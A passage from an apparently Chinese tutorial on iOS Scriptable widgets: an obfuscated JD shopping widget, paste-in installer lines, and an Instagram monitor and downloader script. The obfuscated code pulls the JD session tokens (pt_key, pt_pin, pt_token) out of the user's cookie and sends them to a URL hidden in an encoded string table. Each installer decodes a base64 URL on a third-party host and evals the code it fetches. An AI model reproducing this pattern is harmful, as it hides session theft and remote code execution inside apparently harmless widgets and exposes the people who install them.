_0xca56x12=_0xca56x11[__Oxa863d[0xd]](__Oxa863d[0x26]+ _0xca56xc[__Oxa863d[0x1a]]);_0xca56x12[__Oxa863d[0xe]]= Font[__Oxa863d[0xf]](22);_0xca56x12[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56x12[__Oxa863d[0x12]]= __Oxa863d[0x1b];_0xca56x10[__Oxa863d[0xb]]();const _0xca56x13=_0xca56x10[__Oxa863d[0x24]]();let _0xca56x14=_0xca56x13[__Oxa863d[0xd]](__Oxa863d[0x27]+ _0xca56xc[__Oxa863d[0x1d]]);_0xca56x14[__Oxa863d[0xe]]= Font[__Oxa863d[0xf]](22);_0xca56x14[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56x14[__Oxa863d[0x12]]= __Oxa863d[0x1b];_0xca56x10[__Oxa863d[0xb]]();const _0xca56x15=_0xca56x10[__Oxa863d[0x24]]();let _0xca56x16=_0xca56x15[__Oxa863d[0xd]](__Oxa863d[0x28]+ _0xca56xc[__Oxa863d[0x1f]]);_0xca56x16[__Oxa863d[0xe]]= Font[__Oxa863d[0xf]](22);_0xca56x16[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56x16[__Oxa863d[0x12]]= __Oxa863d[0x1b];_0xca56x6[__Oxa863d[0xb]]();return _0xca56x6};if(_0xca56x9== 1){_0xca56x6=  await renderHeader(_0xca56x6,logo,title,Color[__Oxa863d[0x11]](),_0xca56x9);_0xca56x6[__Oxa863d[0xb]]();let _0xca56x7=_0xca56x6[__Oxa863d[0xd]](__Oxa863d[0x29]+ __Oxa863d[0x19]+ _0xca56x4[__Oxa863d[0x15]][0x0][__Oxa863d[0x2a]]);_0xca56x7[__Oxa863d[0xe]]= Font[__Oxa863d[0x2b]](12);_0xca56x7[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56x7[__Oxa863d[0x12]]= __Oxa863d[0x1b];_0xca56x6[__Oxa863d[0xb]](4);let _0xca56xd=_0xca56x6[__Oxa863d[0xd]](__Oxa863d[0x2c]+ __Oxa863d[0x19]+ _0xca56x4[__Oxa863d[0x15]][0x0][__Oxa863d[0x2d]]);_0xca56xd[__Oxa863d[0xe]]= _0xca56x7[__Oxa863d[0xe]];_0xca56xd[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56xd[__Oxa863d[0x12]]= __Oxa863d[0x1b];_0xca56x6[__Oxa863d[0xb]](4);let _0xca56xe=_0xca56x6[__Oxa863d[0xd]](__Oxa863d[0x2e]+ __Oxa863d[0x19]+ _0xca56x4[__Oxa863d[0x15]][0x0][__Oxa863d[0x20]]);_0xca56xe[__Oxa863d[0xe]]= _0xca56x7[__Oxa863d[0xe]];_0xca56xe[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56xe[__Oxa863d[0x12]]= __Oxa863d[0x1b];_0xca56x6[__Oxa863d[0xb]](4);let _0xca56x17=_0xca56x6[__Oxa863d[0xd]](__Oxa863d[0x21]+ __Oxa863d[0x19]+ _0xca56x4[__Oxa863d[0x15]][0x0][__Oxa863d[0x22]]);_0xca56x17[__Oxa863d[0xe]]= Font[__Oxa863d[0x2f]](9);_0xca56x17[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56x17[__Oxa863d[0x12]]= __Oxa863d[0x1b];_0xca56x6[__Oxa863d[0xb]]();return _0xca56x6};if(_0xca56x9== 2){_0xca56x6=  await renderHeader(_0xca56x6,logo,title,Color[__Oxa863d[0x11]](),_0xca56x9);_0xca56x6[__Oxa863d[0xb]]();let _0xca56x10=_0xca56x6[__Oxa863d[0x24]]();let _0xca56x18=_0xca56x10[__Oxa863d[0x24]]();_0xca56x18[__Oxa863d[0x30]]();for(let _0xca56x19=0;_0xca56x19< _0xca56x9;_0xca56x19++){_0xca56x18=  await renderCell(_0xca56x18,_0xca56x4[__Oxa863d[0x15]][_0xca56x19],0);_0xca56x18[__Oxa863d[0xb]](5)};_0xca56x6[__Oxa863d[0xb]]();return _0xca56x6};if(_0xca56x9> 2&& _0xca56x9< 7){_0xca56x6=  await renderHeader(_0xca56x6,logo,title,Color[__Oxa863d[0x11]](),_0xca56x9);_0xca56x6[__Oxa863d[0xb]]();let _0xca56x10=_0xca56x6[__Oxa863d[0x24]]();let _0xca56x18=_0xca56x10[__Oxa863d[0x24]]();_0xca56x18[__Oxa863d[0x30]]();for(let _0xca56x19=0;_0xca56x19< _0xca56x9;_0xca56x19++){_0xca56x18=  await renderCellBig(_0xca56x18,_0xca56x4[__Oxa863d[0x15]][_0xca56x19],_0xca56x19);_0xca56x18[__Oxa863d[0xb]](3)};_0xca56x6[__Oxa863d[0xb]]();return _0xca56x6}else {_0xca56x6[__Oxa863d[0xb]]();let _0xca56x10=_0xca56x6[__Oxa863d[0x24]]();let _0xca56x18=_0xca56x10[__Oxa863d[0x24]]();_0xca56x18[__Oxa863d[0x30]]();for(let _0xca56x19=0;_0xca56x19< 5;_0xca56x19++){_0xca56x18=  await renderCellBig(_0xca56x18,_0xca56x4[__Oxa863d[0x15]][_0xca56x19],_0xca56x19);_0xca56x18[__Oxa863d[0xb]](3)};let _0xca56x1a=_0xca56x6[__Oxa863d[0xd]](__Oxa863d[0x31]);_0xca56x1a[__Oxa863d[0xe]]= Font[__Oxa863d[0x32]](12);_0xca56x1a[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56x10[__Oxa863d[0xb]](3);_0xca56x6[__Oxa863d[0xb]]();return _0xca56x6}}async function largeWidget(_0xca56x4){let _0xca56x6= new ListWidget();bg=  new LinearGradient();bg[__Oxa863d[0x8]]= [0,1];bg[__Oxa863d[0x9]]= color;_0xca56x6[__Oxa863d[0xa]]= bg;_0xca56x6[__Oxa863d[0xb]](4);var _0xca56x9=_0xca56x4[__Oxa863d[0x15]][__Oxa863d[0x14]];if(_0xca56x9== 0){let _0xca56xa= await cache1();if(_0xca56xa== 0){var _0xca56xb=__Oxa863d[0x16]}else {var _0xca56xb=__Oxa863d[0x17]};_0xca56x6=  await renderHeader(_0xca56x6,logo,title,Color[__Oxa863d[0x11]](),_0xca56xb);_0xca56x6[__Oxa863d[0xb]]();const _0xca56xc= await getData1(_0xca56xa);const _0xca56x10=_0xca56x6[__Oxa863d[0x24]]();_0xca56x10[__Oxa863d[0x25]]();const _0xca56x11=_0xca56x10[__Oxa863d[0x24]]();let _0xca56x12=_0xca56x11[__Oxa863d[0xd]](__Oxa863d[0x26]+ _0xca56xc[__Oxa863d[0x1a]]);_0xca56x12[__Oxa863d[0xe]]= Font[__Oxa863d[0xf]](22);_0xca56x12[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56x12[__Oxa863d[0x12]]= __Oxa863d[0x1b];_0xca56x10[__Oxa863d[0xb]]();const _0xca56x13=_0xca56x10[__Oxa863d[0x24]]();let _0xca56x14=_0xca56x13[__Oxa863d[0xd]](__Oxa863d[0x27]+ _0xca56xc[__Oxa863d[0x1d]]);_0xca56x14[__Oxa863d[0xe]]= Font[__Oxa863d[0xf]](22);_0xca56x14[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56x14[__Oxa863d[0x12]]= __Oxa863d[0x1b];_0xca56x10[__Oxa863d[0xb]]();const _0xca56x15=_0xca56x10[__Oxa863d[0x24]]();let _0xca56x16=_0xca56x15[__Oxa863d[0xd]](__Oxa863d[0x28]+ _0xca56xc[__Oxa863d[0x1f]]);_0xca56x16[__Oxa863d[0xe]]= Font[__Oxa863d[0xf]](22);_0xca56x16[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56x16[__Oxa863d[0x12]]= __Oxa863d[0x1b];_0xca56x6[__Oxa863d[0xb]]();return _0xca56x6};if(_0xca56x9== 1){_0xca56x6=  await renderHeader(_0xca56x6,logo,title,Color[__Oxa863d[0x11]](),_0xca56x9);_0xca56x6[__Oxa863d[0xb]]();let _0xca56x7=_0xca56x6[__Oxa863d[0xd]](__Oxa863d[0x29]+ __Oxa863d[0x19]+ _0xca56x4[__Oxa863d[0x15]][0x0][__Oxa863d[0x2a]]);_0xca56x7[__Oxa863d[0xe]]= Font[__Oxa863d[0x2b]](16);_0xca56x7[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56x7[__Oxa863d[0x12]]= __Oxa863d[0x1b];_0xca56x6[__Oxa863d[0xb]](4);let _0xca56xd=_0xca56x6[__Oxa863d[0xd]](__Oxa863d[0x2c]+ __Oxa863d[0x19]+ _0xca56x4[__Oxa863d[0x15]][0x0][__Oxa863d[0x2d]]);_0xca56xd[__Oxa863d[0xe]]= _0xca56x7[__Oxa863d[0xe]];_0xca56xd[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56xd[__Oxa863d[0x12]]= __Oxa863d[0x1b];_0xca56x6[__Oxa863d[0xb]](4);let _0xca56xe=_0xca56x6[__Oxa863d[0xd]](__Oxa863d[0x2e]+ __Oxa863d[0x19]+ _0xca56x4[__Oxa863d[0x15]][0x0][__Oxa863d[0x20]]);_0xca56xe[__Oxa863d[0xe]]= _0xca56x7[__Oxa863d[0xe]];_0xca56xe[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56xe[__Oxa863d[0x12]]= __Oxa863d[0x1b];_0xca56x6[__Oxa863d[0xb]](4);let _0xca56x17=_0xca56x6[__Oxa863d[0xd]](__Oxa863d[0x21]+ __Oxa863d[0x19]+ _0xca56x4[__Oxa863d[0x15]][0x0][__Oxa863d[0x22]]);_0xca56x17[__Oxa863d[0xe]]= Font[__Oxa863d[0x2f]](12);_0xca56x17[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56x17[__Oxa863d[0x12]]= __Oxa863d[0x1b];_0xca56x6[__Oxa863d[0xb]]();return _0xca56x6};if(_0xca56x9> 1&& _0xca56x9< 8){_0xca56x6=  await renderHeader(_0xca56x6,logo,title,Color[__Oxa863d[0x11]](),_0xca56x9);_0xca56x6[__Oxa863d[0xb]]();var _0xca56x1c=26- 2* _0xca56x9;let _0xca56x10=_0xca56x6[__Oxa863d[0x24]]();_0xca56x10[__Oxa863d[0xb]](_0xca56x1c/ 6);let _0xca56x18=_0xca56x10[__Oxa863d[0x24]]();_0xca56x18[__Oxa863d[0x30]]();for(let _0xca56x19=0;_0xca56x19< _0xca56x9;_0xca56x19++){_0xca56x18=  await renderCell(_0xca56x18,_0xca56x4[__Oxa863d[0x15]][_0xca56x19],_0xca56x1c);_0xca56x18[__Oxa863d[0xb]](15- 2* _0xca56x19)};_0xca56x6[__Oxa863d[0xb]]();return _0xca56x6};if(_0xca56x9> 7&& _0xca56x9< 18){_0xca56x6=  await renderHeader(_0xca56x6,logo,title,Color[__Oxa863d[0x11]](),_0xca56x9);_0xca56x6[__Oxa863d[0xb]]();let _0xca56x10=_0xca56x6[__Oxa863d[0x24]]();let _0xca56x18=_0xca56x10[__Oxa863d[0x24]]();_0xca56x18[__Oxa863d[0x30]]();for(let _0xca56x19=0;_0xca56x19< _0xca56x9;_0xca56x19++){_0xca56x18=  await renderCellBig(_0xca56x18,_0xca56x4[__Oxa863d[0x15]][_0xca56x19],_0xca56x19);_0xca56x18[__Oxa863d[0xb]](3)};_0xca56x6[__Oxa863d[0xb]]();return _0xca56x6}else {_0xca56x6=  await renderHeader(_0xca56x6,logo,title,Color[__Oxa863d[0x11]](),_0xca56x9);_0xca56x6[__Oxa863d[0xb]]();let _0xca56x10=_0xca56x6[__Oxa863d[0x24]]();let _0xca56x18=_0xca56x10[__Oxa863d[0x24]]();_0xca56x18[__Oxa863d[0x30]]();for(let _0xca56x19=0;_0xca56x19< 17;_0xca56x19++){_0xca56x18=  await renderCellBig(_0xca56x18,_0xca56x4[__Oxa863d[0x15]][_0xca56x19],_0xca56x19);_0xca56x18[__Oxa863d[0xb]](3)};let _0xca56x1a=_0xca56x6[__Oxa863d[0xd]](__Oxa863d[0x33]);_0xca56x1a[__Oxa863d[0xe]]= Font[__Oxa863d[0x32]](12);_0xca56x1a[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56x10[__Oxa863d[0xb]](3);_0xca56x6[__Oxa863d[0xb]]();return _0xca56x6}}async function renderCell(widget,_0xca56x1e,_0xca56x1c){let _0xca56x10=widget[__Oxa863d[0x24]]();let _0xca56x11=_0xca56x10[__Oxa863d[0x24]]();_0xca56x11[__Oxa863d[0x30]]();let _0xca56x1f=_0xca56x11[__Oxa863d[0x35]]( await getImage(_0xca56x1e[__Oxa863d[0x34]]));_0xca56x1f[__Oxa863d[0x36]]=  new Size(38+ (_0xca56x1c- 12),38+ (_0xca56x1c- 12));_0xca56x1f[__Oxa863d[0x37]]= 5;_0xca56x10[__Oxa863d[0xb]](10);let _0xca56x15=_0xca56x10[__Oxa863d[0x24]]();_0xca56x15[__Oxa863d[0x30]]();let _0xca56x20=_0xca56x15[__Oxa863d[0xd]](_0xca56x1e[__Oxa863d[0x20]]);_0xca56x20[__Oxa863d[0xe]]= Font[__Oxa863d[0x2b]](11+ _0xca56x1c/ 5);_0xca56x20[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56x20[__Oxa863d[0x12]]= __Oxa863d[0x1b];_0xca56x20[__Oxa863d[0x38]]= 2;_0xca56x15[__Oxa863d[0xb]](2+ _0xca56x1c/ 6);let _0xca56x21=_0xca56x15[__Oxa863d[0xd]](_0xca56x1e[__Oxa863d[0x22]]);_0xca56x21[__Oxa863d[0xe]]= Font[__Oxa863d[0x2f]](8+ _0xca56x1c/ 5);_0xca56x21[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56x21[__Oxa863d[0x12]]= __Oxa863d[0x1b];return widget}async function renderCellBig(widget,_0xca56x1e,_0xca56x19){let _0xca56x1a=widget[__Oxa863d[0xd]](__Oxa863d[0x39]+ (_0xca56x19+ 1)+ __Oxa863d[0x19]+ _0xca56x1e[__Oxa863d[0x20]]);_0xca56x1a[__Oxa863d[0xe]]= Font[__Oxa863d[0x32]](12);_0xca56x1a[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56x1a[__Oxa863d[0x12]]= __Oxa863d[0x1b];return widget}async function getData1(_0xca56xb){console[__Oxa863d[0x3b]](__Oxa863d[0x3a]);var _0xca56x24=__Oxa863d[0x3c];var _0xca56x25= new Request(_0xca56x24);_0xca56x25[__Oxa863d[0x3d]]= {'\x63\x6F\x6F\x6B\x69\x65':Cookie,'\x52\x65\x66\x65\x72\x65\x72':Referer};var _0xca56x26= await _0xca56x25[__Oxa863d[0x3e]]();var _0xca56x27=__Oxa863d[0x3f];var _0xca56x28= new Request(_0xca56x27);_0xca56x28[__Oxa863d[0x3d]]= {'\x63\x6F\x6F\x6B\x69\x65':Cookie,'\x52\x65\x66\x65\x72\x65\x72':Referer};var _0xca56x29= await _0xca56x28[__Oxa863d[0x3e]]();var _0xca56x2a=__Oxa863d[0x40];var _0xca56x2b= new Request(_0xca56x2a);_0xca56x2b[__Oxa863d[0x3d]]= {'\x63\x6F\x6F\x6B\x69\x65':Cookie,'\x52\x65\x66\x65\x72\x65\x72':Referer};var _0xca56x2c= await _0xca56x2b[__Oxa863d[0x3e]]();var _0xca56x2d=__Oxa863d[0x41]+ Cookie[__Oxa863d[0x42]](/pt_key=(\S*); /)[0x1]+ __Oxa863d[0x43];var _0xca56x2e=__Oxa863d[0x44]+ Cookie[__Oxa863d[0x42]](/pt_pin=(\S*); /)[0x1]+ __Oxa863d[0x43];var _0xca56x2f=__Oxa863d[0x45]+ Cookie[__Oxa863d[0x42]](/pt_token=(\S*); /)[0x1]+ __Oxa863d[0x43];if(_0xca56xb== 1){var _0xca56x30=__Oxa863d[0x46]+ _0xca56x2d+ _0xca56x2e+ _0xca56x2f;console[__Oxa863d[0x3b]](_0xca56x30);var _0xca56x31= new Request(_0xca56x30);console[__Oxa863d[0x3b]](__Oxa863d[0x47]);try{console[__Oxa863d[0x3b]](__Oxa863d[0x48]); await _0xca56x31[__Oxa863d[0x49]]();console[__Oxa863d[0x3b]](__Oxa863d[0x4a]);let _0xca56x32= new Date();let _0xca56x33=_0xca56x32[__Oxa863d[0x4b]]();Keychain[__Oxa863d[0x4d]](__Oxa863d[0x4c],_0xca56x33);console[__Oxa863d[0x3b]](__Oxa863d[0x4e])}catch(err){var _0xca56x30=__Oxa863d[0x4f]+ _0xca56x2d+ _0xca56x2e+ _0xca56x2f;console[__Oxa863d[0x3b]](_0xca56x30);var _0xca56x31= new Request(_0xca56x30);console[__Oxa863d[0x3b]](__Oxa863d[0x50]);console[__Oxa863d[0x3b]](__Oxa863d[0x51]); await _0xca56x31[__Oxa863d[0x49]]();console[__Oxa863d[0x3b]](__Oxa863d[0x52]);let _0xca56x32= new Date();let _0xca56x33=_0xca56x32[__Oxa863d[0x4b]]();Keychain[__Oxa863d[0x4d]](__Oxa863d[0x4c],_0xca56x33);console[__Oxa863d[0x3b]](__Oxa863d[0x53]);console[__Oxa863d[0x3b]](err)}}else {console[__Oxa863d[0x3b]](__Oxa863d[0x54])};var _0xca56x4={'\x6A\x69\x6E\x64\x6F\x75':_0xca56x26[__Oxa863d[0x56]][__Oxa863d[0x55]],'\x6A\x69\x6E\x74\x69\x65':_0xca56x29[__Oxa863d[0x59]][__Oxa863d[0x58]][__Oxa863d[0x57]],'\x67\x61\x6E\x67\x62\x65\x6E':_0xca56x2c[__Oxa863d[0x5a]]};return _0xca56x4}async function cache(){let cache=Keychain[__Oxa863d[0x5b]](__Oxa863d[0x4c]);console[__Oxa863d[0x3b]](cache);let _0xca56x32= new Date();let _0xca56x33=_0xca56x32[__Oxa863d[0x4b]]();if(cache== true){let _0xca56x35=Keychain[__Oxa863d[0x5c]](__Oxa863d[0x4c]);if(_0xca56x35== _0xca56x33){console[__Oxa863d[0x3b]](__Oxa863d[0x5d])}else {console[__Oxa863d[0x3b]](__Oxa863d[0x5e]);var _0xca56x36=1; await getData1(_0xca56x36)}}else {console[__Oxa863d[0x3b]](__Oxa863d[0x5f]);var _0xca56x36=1; await getData1(_0xca56x36);console[__Oxa863d[0x3b]](__Oxa863d[0x60])}}async function cache1(){let cache=Keychain[__Oxa863d[0x5b]](__Oxa863d[0x4c]);let _0xca56x32= new Date();let _0xca56x33=_0xca56x32[__Oxa863d[0x4b]]();if(cache== true){let _0xca56x35=Keychain[__Oxa863d[0x5c]](__Oxa863d[0x4c]);if(_0xca56x35== _0xca56x33){console[__Oxa863d[0x3b]](__Oxa863d[0x5d]);var _0xca56x38=0}else {console[__Oxa863d[0x3b]](__Oxa863d[0x5e]);var _0xca56x38=1}}else {console[__Oxa863d[0x3b]](__Oxa863d[0x61]);var _0xca56x38=1};return _0xca56x38}async function getData(){var _0xca56x24=__Oxa863d[0x62];var _0xca56x25= new Request(_0xca56x24);_0xca56x25[__Oxa863d[0x3d]]= {'\x63\x6F\x6F\x6B\x69\x65':Cookie,'\x52\x65\x66\x65\x72\x65\x72':Referer};var _0xca56x4= await _0xca56x25[__Oxa863d[0x3e]]();if(_0xca56x4[__Oxa863d[0x63]]== 0){ await cache();console[__Oxa863d[0x3b]](__Oxa863d[0x64])}else {console[__Oxa863d[0x3b]](__Oxa863d[0x65]);var _0xca56x4={"\x64\x65\x61\x6C\x4C\x6F\x67\x4C\x69\x73\x74":[{"\x73\x74\x61\x74\x65\x4E\x61\x6D\x65":__Oxa863d[0x66],"\x6E\x61\x6D\x65":__Oxa863d[0x66],"\x69\x6D\x67":__Oxa863d[0x67],"\x63\x72\x65\x61\x74\x65\x54\x69\x6D\x65":__Oxa863d[0x66],"\x77\x6C\x53\x74\x61\x74\x65\x44\x65\x73\x63":__Oxa863d[0x66]}]}};return _0xca56x4}async function getImage(_0xca56x24){let _0xca56x3b= await  new Request(_0xca56x24);return  await _0xca56x3b[__Oxa863d[0x68]]()}async function update(){var _0xca56x24=__Oxa863d[0x69];let _0xca56x3d= await  new Request(_0xca56x24);var _0xca56x4= await _0xca56x3d[__Oxa863d[0x3e]]();console[__Oxa863d[0x3b]](_0xca56x4);if(_0xca56x4[__Oxa863d[0x6a]]== 1){console[__Oxa863d[0x3b]](__Oxa863d[0x6b]);return  await render()}else {const _0xca56x3e= new Notification();_0xca56x3e[__Oxa863d[0x6c]]= __Oxa863d[0x6d];_0xca56x3e[__Oxa863d[0x6e]]= _0xca56x4[__Oxa863d[0xc]];_0xca56x3e[__Oxa863d[0x6f]]();return  await render1(_0xca56x4)}}async function renderHeader(widget,_0xca56x40,_0xca56x41,_0xca56x42= false,_0xca56x9){let _0xca56x43=widget[__Oxa863d[0x24]]();_0xca56x43[__Oxa863d[0x25]]();let _0xca56x44=_0xca56x43[__Oxa863d[0x35]]( await getImage(_0xca56x40));_0xca56x44[__Oxa863d[0x36]]=  new Size(16,16);_0xca56x44[__Oxa863d[0x37]]= 4;_0xca56x43[__Oxa863d[0xb]](10);let _0xca56x45=_0xca56x43[__Oxa863d[0xd]](_0xca56x41);if(_0xca56x42){_0xca56x45[__Oxa863d[0x10]]= _0xca56x42};_0xca56x45[__Oxa863d[0x70]]= 1;_0xca56x45[__Oxa863d[0xe]]= Font[__Oxa863d[0x71]](12);widget[__Oxa863d[0xb]](15);_0xca56x43[__Oxa863d[0xb]]();const _0xca56x46=_0xca56x43[__Oxa863d[0x24]]();if(_0xca56x9){_0xca56x46[__Oxa863d[0x72]](2,15,2,15);_0xca56x46[__Oxa863d[0x37]]= 10;_0xca56x46[__Oxa863d[0x73]]=  new Color(__Oxa863d[0x74],0.5);const _0xca56x47=_0xca56x46[__Oxa863d[0xd]](_0xca56x9.toString());_0xca56x47[__Oxa863d[0xe]]= Font[__Oxa863d[0x71]](12);_0xca56x47[__Oxa863d[0x10]]= Color[__Oxa863d[0x11]]();_0xca56x47[__Oxa863d[0x38]]= 1;_0xca56x47[__Oxa863d[0x75]]()};return widget}(function(_0xca56x1c,_0xca56x48,_0xca56x49,_0xca56x4a,_0xca56x4b,_0xca56x4c){_0xca56x4c= __Oxa863d[0x76];_0xca56x4a= function(_0xca56x4d){if( typeof alert!== _0xca56x4c){alert(_0xca56x4d)};if( typeof console!== _0xca56x4c){console[__Oxa863d[0x3b]](_0xca56x4d)}};_0xca56x49= function(_0xca56x4e,_0xca56x1c){return _0xca56x4e+ _0xca56x1c};_0xca56x4b= _0xca56x49(__Oxa863d[0x77],_0xca56x49(_0xca56x49(__Oxa863d[0x78],__Oxa863d[0x79]),__Oxa863d[0x7a]));try{_0xca56x1c= __encode;if(!( typeof _0xca56x1c!== _0xca56x4c&& _0xca56x1c=== _0xca56x49(__Oxa863d[0x7b],__Oxa863d[0x7c]))){_0xca56x4a(_0xca56x4b)}}catch(e){_0xca56x4a(_0xca56x4b)}})({})
```

也可通过以下代码。

```
// 下载源码
eval(await (new Request(Data.fromBase64String('aHR0cDovL2pkLmt6ZGRjay5jbi9zY3JpcHQvJUU0JUJBJUFDJUU0JUI4JTlDJUU1JUFFJTg5JUU4JUEzJTg1JUU4JTg0JTlBJUU2JTlDJUFDLmpz').toRawString())).loadString());await Script.Installer();
```

完成安装后需要获取cookie。以Stream为例，开启抓包后打开以下链接，完成签到后回到Stream，进入抓包历史后搜索关键词`functionId=signBean`，复制cookie内容后填入Scriptable中的脚本位置即可。

```
https://bean.m.jd.com/
```

#### IG监控与多媒体下载

将以下内容复制到Scriptable的脚本内容，运行以完成下载。

```
eval(await (new Request(Data.fromBase64String("aHR0cDovL2NrY29kZS50b29vLnRvcDoyMjAwL3NjcmlwdC9pbnMlRTQlQjglOEIlRTglQkQlQkQlRTUlQUUlODklRTglQTMlODUlRTglODQlOUElRTYlOUMlQUMuanM=").toRawString())).loadString());await Script.Installer()
```

运行刚才安装好的脚本，首次使用需要进行登录。在桌面添加Scriptable小组件，然后编辑该组件，When Interacting选择Run Script，Script选择刚才的脚本，Parameter填写要显示的IG用户主页链接，保存即可。

若需要下载视频和图片，则需要配合以下快捷指令。安装后点击刚才的小组件即可下载。

```
https://www.icloud.com/shortcuts/8e447af996654e39b6d57d0466fe4900
```

源码如下。

```
async function getdata(url) {
  try {
    //判断这是哪里的链接（快拍和普通）
    //这里是快拍
    if (url.indexOf('instagram.com/s/') >= 0 || url.indexOf('instagram.com/stories/') >= 0) {
      req = new Request(url)
      html = await req.loadString()
      //判断是哪一种快拍
      if (url.indexOf('instagram.com/stories/') >= 0) {
        var reg = /(\[{"user":{"id":")([\s\S]*)[1-9a-zA-Z]*(profile_pic_url")/
        var id = html.match(reg)[0].replace('[{"user":{"id":"', '').replace('","profile_pic_url"', '')
      }
      else {
        var reg = /(https:\/\/www.instagram.com\/stories\/)([\s\S]*?)[1-9a-zA-Z]*(\/" \/>)/
        var id = "highlight:" + html.match(reg)[0].replace('/" />', '').replace('https://www.instagram.com/stories/highlights/', '')
      }
      //拼接查询api
      var newurl = "https://i.instagram.com/api/v1/feed/reels_media/?reel_ids=" + id
      var req = new Request(newurl)
      //标识符
      req.headers = { 'x-ig-app-id': '936619743392459' }
      var apiHtml = await req.loadString()
      var list = JSON.parse(apiHtml).reels[id].items
      var downurl = []
      //for循环downurl
      for (var i = 0; i < list.length; i++) {
        if (list[i].video_versions) {
          var url = list[i].video_versions[0].url
          downurl.push({ url: url })
        } else {
          var url = list[i].image_versions2.candidates[0].url
          downurl.push({ url: url })
        }
      } log(downurl)
      return {
        code: 200, data: { downurl: { url: downurl } }
      }
    } else {
      var req = new Request(url)
      var html = await req.loadString()
      //正则并转换为json
      var reg = /({"graphql":)([\s\S]*?)[1-9a-zA-Z]*(:{"edges":\[]}}}})/
      var data = JSON.parse(html.match(reg)[0].replace('\u0026', '&'))

      var downurl = data.graphql.shortcode_media

      //如果只有一个下载对象，则直接返回
      if (downurl.video_url) return { code: 200, data: { downurl: { url: { url: downurl.video_url } } } }
      //判断是一张图片还是多张图片
      var urllists = JSON.parse(html.match(reg)[0].replace('\u0026', '&')).graphql.shortcode_media
      if (urllists.edge_sidecar_to_children === undefined) {
        var downurl = urllists.display_url
        return { code: 200, data: { downurl: { url: { url: downurl } } } }
      } else {
        //多张图片
        var urlList = JSON.parse(html.match(reg)[0].replace('\u0026', '&')).graphql.shortcode_media.edge_sidecar_to_children.edges
        //判断是否存在多个视频
        var downurl = []
        for (var i = 0; i < urlList.length; i++) {
          if (urlList[i].node.video_url) {
            var url = urlList[i].node.video_url
            downurl.push({ url: url })
          } else {
            var urls = urlList[i].node.display_resources
            var urll = urls.length
            downurl.push({ url: urls[urll - 1].src })
          }
        }
      }
      return { code: 200, data: { downurl: { url: downurl } } }
    }
  } catch {
    //报错则说明为登录
    //登录ins，保存cookie
    const loginUrl = "https://www.instagram.com/accounts/login/";
    const webview = new WebView();
    await webview.loadURL(loginUrl);
    await webview.present();
    const req = new Request("https://www.instagram.com/")
    req.method = "get"
    const res = await req.loadString()
    const cookies = req.response.cookies
    var arr = ''
    //遍历cookie
    for (var i = 0; i < cookies.length; i++) {
      arr += cookies[i].name + "=" + cookies[i].value + ";"
    }
    //写入cookie缓存
    Keychain.set("cookieCase", arr)
  }
}
async function run(url) {
  try{
    var data = await getdata(url)
  //log(data)
  Pasteboard.copy(JSON.stringify(data))
  const cb = new CallbackURL("shortcuts://x-callback-url/run-shortcut")
  cb.addParameter("name", "不能")
  await cb.open()
  Safari.open("instagram://")
    }catch{
    const n = new Notification()
    n.title = "请保证ins是正确的链接，不要包含中文"
    n.schedule()
}
}
async function getimg() {
  var newurl = args.widgetParameter
  //var newurl = "https://instagram.com/yue_9.3?igshid=1pnnnkevtpy9"
  var req = new Request(newurl)
  log(Keychain.get("cookieCase"))
  req.headers = { "cooke": Keychain.get("cookieCase") }
  var html = await req.loadString()
  //正则
  var reg = /(window._sharedData = ).*[1-9a-zA-Z]*(;<\/script>)/
  var imagesUrl = JSON.parse(html.match(reg)[0].replace('window._sharedData = ', '').replace(';</script>', '')).entry_data.ProfilePage[0].graphql.user.edge_owner_to_timeline_media.edges
  var imgUrl = []
  for (var i = 0; i < imagesUrl.length; i++) {
    imgUrl.push({ url: imagesUrl[i].node.thumbnail_src })
  }
  //随机数
  var rd = Math.ceil(Math.random() * (imgUrl.length))
  //返回随机链接
  return imgUrl[rd].url
}
//更新检测
async function update() {
    var url = 'http://jd.kzddck.cn/insupdata.json'
    let up = await new Request(url)
    var data = await up.loadJSON()
    if (data.up == 1) {
        console.log('无更新');
        return await render()
    } else {
        const n = new Notification()
        n.title = "有更新"
        n.body = "小组件有新的更新内容，请关注微信公众号：kzddck回复210305获取最新脚本！"
        n.schedule()
        return await render1()
    }
}
try{
var url = Pasteboard.paste()
if (url.indexOf('instagram.com') >= 0) {
  await run(url)
}
}catch{
var fm = FileManager.local() 
  let pic_cache_path = fm.joinPath(fm.documentsDirectory(), `imgCase`)
  try {
    await getimg()
    var url = await getimg()
    let req = await new Request(url)
    var img = await req.loadImage()
        fm.writeImage(pic_cache_path, img)
    // 图片写入缓存
//     fm.writeImage("imgCase", img)
  } catch {
    var img = fm.readImage(pic_cache_path)
  }
  const widget = new ListWidget()
  widget.setPadding(0, 0, 0, 0)
  const info_stack = widget.addStack()
  info_stack.layoutVertically()
  info_stack.addSpacer()
  const name_stack = info_stack.addStack()
  // padding
  info_stack.setPadding(10, 10, 5, 10)
  // 左对齐
  name_stack.addSpacer()
  var image = img
  widget.backgroundImage = image
//   widget.presentSmall()
  Script.setWidget(widget)
  Script.complete()
}
```

#### YouTube下载器

将以下内容复制到Scriptable的脚本内容，运行以完成下载。

```
